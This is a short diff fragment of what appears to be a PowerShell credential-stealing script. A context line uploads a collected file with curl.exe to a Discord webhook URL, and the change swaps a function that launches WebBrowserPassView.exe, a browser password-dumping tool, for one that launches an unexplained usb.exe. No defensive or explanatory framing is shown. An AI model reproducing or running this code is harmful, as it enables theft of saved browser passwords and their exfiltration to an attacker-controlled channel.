@@ -38,5 +38,5 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUr
 
 
 function Open{
-.\WebBrowserPassView.exe
+.\usb.exe
 }
